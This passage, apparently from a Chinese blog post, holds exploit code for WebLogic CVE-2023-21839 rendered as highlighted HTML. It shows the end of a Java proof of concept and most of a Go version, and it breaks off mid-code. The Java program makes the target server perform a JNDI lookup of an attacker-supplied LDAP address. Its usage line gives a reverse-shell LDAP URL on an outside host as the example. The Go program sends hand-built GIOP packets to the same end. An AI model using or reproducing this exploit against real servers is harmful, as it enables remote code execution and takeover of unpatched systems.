string\">\"weblogic.jndi.WLInitialContextFactory\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">static</span> String HOW_TO_USE <span class=\"token operator\">=</span> <span class=\"token string\">\"[*]java -jar 目标ip:端口 ldap地址\\ne.g. java -jar 192.168.220.129:7001 ldap://192.168.31.58:1389/Basic/ReverseShell/192.168.220.129/1111\"</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token function\">CVE_2023_21839</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> InitialContext <span class=\"token function\">getInitialContext</span><span class=\"token punctuation\">(</span>String url<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> NamingException <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        Hashtable<span class=\"token operator\">&lt;</span>String<span class=\"token punctuation\">,</span> String<span class=\"token operator\">></span> env <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Hashtable</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        env<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"java.naming.factory.initial\"</span><span class=\"token punctuation\">,</span> JNDI_FACTORY<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        env<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"java.naming.provider.url\"</span><span class=\"token punctuation\">,</span> url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">InitialContext</span><span class=\"token punctuation\">(</span>env<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span>String<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> Exception <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">.</span>length <span class=\"token operator\">&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n            System<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>HOW_TO_USE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            System<span class=\"token punctuation\">.</span><span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n        String t3Url <span class=\"token operator\">=</span> args<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        String ldapUrl <span class=\"token operator\">=</span> args<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        InitialContext c <span class=\"token operator\">=</span> <span class=\"token function\">getInitialContext</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"t3://\"</span> <span class=\"token operator\">+</span> t3Url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        Hashtable<span class=\"token operator\">&lt;</span>String<span class=\"token punctuation\">,</span> String<span class=\"token operator\">></span> env <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Hashtable</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        env<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"java.naming.factory.initial\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"com.sun.jndi.rmi.registry.RegistryContextFactory\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        ForeignOpaqueReference f <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ForeignOpaqueReference</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        Field jndiEnvironment <span class=\"token operator\">=</span> ForeignOpaqueReference<span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"jndiEnvironment\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        jndiEnvironment<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        jndiEnvironment<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">,</span> env<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        Field remoteJNDIName <span class=\"token operator\">=</span> ForeignOpaqueReference<span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"remoteJNDIName\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        remoteJNDIName<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        remoteJNDIName<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">,</span> ldapUrl<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        String bindName <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Random</span><span class=\"token punctuation\">(</span>System<span class=\"token punctuation\">.</span><span class=\"token function\">currentTimeMillis</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">nextLong</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n            c<span class=\"token punctuation\">.</span><span class=\"token function\">bind</span><span class=\"token punctuation\">(</span>bindName<span class=\"token punctuation\">,</span> f<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            c<span class=\"token punctuation\">.</span><span class=\"token function\">lookup</span><span class=\"token punctuation\">(</span>bindName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> var10<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<h3 id=\"GO-待看\"><a href=\"#GO-待看\" class=\"headerlink\" title=\"GO(待看)\"></a>GO(待看)</h3><pre class=\" language-go\"><code class=\"language-go\"><span class=\"token keyword\">package</span> main\n\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">(</span>\n    <span class=\"token string\">\"CVE-2023-21839\"</span>\n    <span class=\"token string\">\"encoding/binary\"</span>\n    <span class=\"token string\">\"encoding/hex\"</span>\n    <span class=\"token string\">\"flag\"</span>\n    <span class=\"token string\">\"fmt\"</span>\n    <span class=\"token string\">\"net\"</span>\n    <span class=\"token string\">\"strings\"</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">var</span> <span class=\"token punctuation\">(</span>\n    hostConfig <span class=\"token builtin\">string</span>\n    portConfig <span class=\"token builtin\">int</span>\n    ldapConfig <span class=\"token builtin\">string</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">var</span> <span class=\"token punctuation\">(</span>\n    key1    <span class=\"token builtin\">string</span>\n    key2    <span class=\"token builtin\">string</span>\n    key3    <span class=\"token builtin\">string</span>\n    wlsKey1 <span class=\"token builtin\">string</span>\n    wlsKey2 <span class=\"token builtin\">string</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">var</span> <span class=\"token punctuation\">(</span>\n    ServiceContext0 <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>giop<span class=\"token punctuation\">.</span>ServiceContext<span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        VSCID<span class=\"token punctuation\">:</span>      giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"000000\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        SCID<span class=\"token punctuation\">:</span>       giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"05\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        Endianness<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>giop<span class=\"token punctuation\">.</span>BigEndianType<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n        Data<span class=\"token punctuation\">:</span>       giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"000000000000010000000d3137322e32362e3131322e310000ec5b\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n    ServiceContext1 <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>giop<span class=\"token punctuation\">.</span>ServiceContext<span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        VSCID<span class=\"token punctuation\">:</span>      giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"000000\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        SCID<span class=\"token punctuation\">:</span>       giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"01\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        Endianness<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>giop<span class=\"token punctuation\">.</span>BigEndianType<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n        Data<span class=\"token punctuation\">:</span>       giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0000000001002005010001\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n    ServiceContext2 <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>giop<span class=\"token punctuation\">.</span>ServiceContext<span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        VSCID<span class=\"token punctuation\">:</span>      giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"424541\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        SCID<span class=\"token punctuation\">:</span>       giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"00\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        Endianness<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>giop<span class=\"token punctuation\">.</span>BigEndianType<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n        Data<span class=\"token punctuation\">:</span>       giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0a0301\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n    flag<span class=\"token punctuation\">.</span><span class=\"token function\">StringVar</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>hostConfig<span class=\"token punctuation\">,</span> <span class=\"token string\">\"ip\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"ip\"</span><span class=\"token punctuation\">)</span>\n    flag<span class=\"token punctuation\">.</span><span class=\"token function\">IntVar</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>portConfig<span class=\"token punctuation\">,</span> <span class=\"token string\">\"port\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7001</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"port\"</span><span class=\"token punctuation\">)</span>\n    flag<span class=\"token punctuation\">.</span><span class=\"token function\">StringVar</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>ldapConfig<span class=\"token punctuation\">,</span> <span class=\"token string\">\"ldap\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"ldap\"</span><span class=\"token punctuation\">)</span>\n    flag<span class=\"token punctuation\">.</span><span class=\"token function\">Parse</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">if</span> hostConfig <span class=\"token operator\">==</span> <span class=\"token string\">\"\"</span> <span class=\"token operator\">||</span> ldapConfig <span class=\"token operator\">==</span> <span class=\"token string\">\"\"</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Weblogic CVE-2023-21839\"</span><span class=\"token punctuation\">)</span>\n        flag<span class=\"token punctuation\">.</span><span class=\"token function\">Usage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token operator\">!</span>strings<span class=\"token punctuation\">.</span><span class=\"token function\">HasPrefix</span><span class=\"token punctuation\">(</span>ldapConfig<span class=\"token punctuation\">,</span> <span class=\"token string\">\"ldap\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Weblogic CVE-2023-21839\"</span><span class=\"token punctuation\">)</span>\n        flag<span class=\"token punctuation\">.</span><span class=\"token function\">Usage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n    fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[*] your-ip: %s\\n\"</span><span class=\"token punctuation\">,</span> hostConfig<span class=\"token punctuation\">)</span>\n    fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[*] your-port: %d\\n\"</span><span class=\"token punctuation\">,</span> portConfig<span class=\"token punctuation\">)</span>\n    fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[*] your-ldap: %s\\n\"</span><span class=\"token punctuation\">,</span> ldapConfig<span class=\"token punctuation\">)</span>\n\n    vp <span class=\"token operator\">:=</span> <span class=\"token string\">\"743320392e322e302e300a41533a3235350a484c3a39320a4d5\"</span> <span class=\"token operator\">+</span>\n        <span class=\"token string\">\"33a31303030303030300a50553a74333a2f2f746573743a373030310a0a\"</span>\n    ver <span class=\"token operator\">:=</span> giop<span class=\"token punctuation\">.</span><span class=\"token function\">GetVersion</span><span class=\"token punctuation\">(</span>hostConfig<span class=\"token punctuation\">,</span> vp<span class=\"token punctuation\">,</span> portConfig<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> ver <span class=\"token operator\">==</span> <span class=\"token string\">\"12\"</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[*] weblogic 12\"</span><span class=\"token punctuation\">)</span>\n        wlsKey1 <span class=\"token operator\">=</span> <span class=\"token string\">\"00424541080103000000000c41646d696e53657276657200000000000000003349\"</span> <span class=\"token operator\">+</span>\n            <span class=\"token string\">\"444c3a7765626c6f6769632f636f7262612f636f732f6e616d696e672f4e616d696e6743\"</span> <span class=\"token operator\">+</span>\n            <span class=\"token string\">\"6f6e74657874416e793a312e3000000000000238000000000000014245412c0000001000\"</span> <span class=\"token operator\">+</span>\n            <span class=\"token string\">\"00000000000000{;{;key1};};\"</span>\n        wlsKey2 <span class=\"token operator\">=</span> <span class=\"token string\">\"00424541080103000000000c41646d696e53657276657200000000000000003349\"</span> <span class=\"token operator\">+</span>\n            <span class=\"token string\">\"444c3a7765626c6f6769632f636f7262612f636f732f6e616d696e672f4e616d696e6743\"</span> <span class=\"token operator\">+</span>\n            <span class=\"token string\">\"6f6e74657874416e793a312e30000000000004{;{;key3};};000000014245412c0000001000\"</span> <span class=\"token operator\">+</span>\n            <span class=\"token string\">\"00000000000000{;{;key1};};\"</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> ver <span class=\"token operator\">==</span> <span class=\"token string\">\"14\"</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[*] weblogic 14\"</span><span class=\"token punctuation\">)</span>\n        wlsKey1 <span class=\"token operator\">=</span> <span class=\"token string\">\"00424541080103000000000c41646\"</span> <span class=\"token operator\">+</span>\n            <span class=\"token string\">\"d696e53657276657200000000000000003349444c3a7765626c\"</span> <span class=\"token operator\">+</span>\n            <span class=\"token string\">\"6f6769632f636f7262612f636f732f6e616d696e672f4e616d6\"</span> <span class=\"token operator\">+</span>\n            <span class=\"token string\">\"96e67436f6e74657874416e793a312e30000000000002380000\"</span> <span class=\"token operator\">+</span>\n            <span class=\"token string\">\"00000000014245412e000000100000000000000000{;{;key1};};\"</span>\n        wlsKey2 <span class=\"token operator\">=</span> <span class=\"token string\">\"00424541080103000000000c41646d696e53657276657\"</span> <span class=\"token operator\">+</span>\n            <span class=\"token string\">\"200000000000000003349444c3a7765626c6f6769632f636f72\"</span> <span class=\"token operator\">+</span>\n            <span class=\"token string\">\"62612f636f732f6e616d696e672f4e616d696e67436f6e74657\"</span> <span class=\"token operator\">+</span>\n            <span class=\"token string\">\"874416e793a312e30000000000004{;{;key3};};00000001424541\"</span> <span class=\"token operator\">+</span>\n            <span class=\"token string\">\"2e000000100000000000000000{;{;key1};};\"</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[!] error and exit\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n    host <span class=\"token operator\">:=</span> hostConfig\n    port <span class=\"token operator\">:=</span> portConfig\n    conn<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> net<span class=\"token punctuation\">.</span><span class=\"token function\">Dial</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"tcp\"</span><span class=\"token punctuation\">,</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s:%d\"</span><span class=\"token punctuation\">,</span> host<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    rmi <span class=\"token operator\">:=</span> ldapConfig\n    <span class=\"token comment\" spellcheck=\"true\">// [ldap len] [ldap string]</span>\n    ldap <span class=\"token operator\">:=</span> hex<span class=\"token punctuation\">.</span><span class=\"token function\">EncodeToString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span><span class=\"token function\">byte</span><span class=\"token punctuation\">(</span><span class=\"token function\">len</span><span class=\"token punctuation\">(</span>rmi<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span>\n    ldap <span class=\"token operator\">+=</span> hex<span class=\"token punctuation\">.</span><span class=\"token function\">EncodeToString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token function\">byte</span><span class=\"token punctuation\">(</span>rmi<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n    locateRequest <span class=\"token operator\">:=</span> <span class=\"token operator\">&amp;</span>giop<span class=\"token punctuation\">.</span>LocateRequest<span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        Header<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span>giop<span class=\"token punctuation\">.</span>Header<span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n            Magic<span class=\"token punctuation\">:</span>        giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span>giop<span class=\"token punctuation\">.</span>GIOP<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            MajorVersion<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>giop<span class=\"token punctuation\">.</span>MajorVersion<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n            MinorVersion<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>giop<span class=\"token punctuation\">.</span>MinorVersion<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n            MessageFlags<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>giop<span class=\"token punctuation\">.</span>BigEndianType<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n            MessageType<span class=\"token punctuation\">:</span>  <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>giop<span class=\"token punctuation\">.</span>LocateRequestType<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n        RequestId<span class=\"token punctuation\">:</span>     giop<span class=\"token punctuation\">.</span><span class=\"token function\">Int32</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        TargetAddress<span class=\"token punctuation\">:</span> giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span>giop<span class=\"token punctuation\">.</span>KeyAddr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        KeyAddress<span class=\"token punctuation\">:</span>    giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span>giop<span class=\"token punctuation\">.</span>NameService<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n    giop<span class=\"token punctuation\">.</span><span class=\"token function\">Log</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"LocateRequest\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">_</span> <span class=\"token operator\">=</span> conn<span class=\"token punctuation\">.</span><span class=\"token function\">Write</span><span class=\"token punctuation\">(</span>locateRequest<span class=\"token punctuation\">.</span><span class=\"token function\">Bytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    buf <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1024</span><span class=\"token operator\">*</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span>\n    <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">_</span> <span class=\"token operator\">=</span> conn<span class=\"token punctuation\">.</span><span class=\"token function\">Read</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span>\n\n    temp1 <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\n    temp2 <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token comment\" spellcheck=\"true\">// GIOP Header</span>\n    <span class=\"token comment\" spellcheck=\"true\">// IOR Prefix</span>\n    iOff <span class=\"token operator\">:=</span> <span class=\"token number\">0x60</span>\n    <span class=\"token keyword\">for</span> buf<span class=\"token punctuation\">[</span>iOff<span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0x00</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\" spellcheck=\"true\">// ProfileHost</span>\n        iOff<span class=\"token operator\">++</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> iOff <span class=\"token operator\">></span> <span class=\"token number\">1024</span><span class=\"token operator\">*</span><span class=\"token number\">10</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> buf<span class=\"token punctuation\">[</span>iOff<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">0x00</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        iOff<span class=\"token operator\">++</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n    p <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    p<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> buf<span class=\"token punctuation\">[</span>iOff<span class=\"token punctuation\">]</span>\n    iOff<span class=\"token operator\">++</span>\n    p<span class=\"token 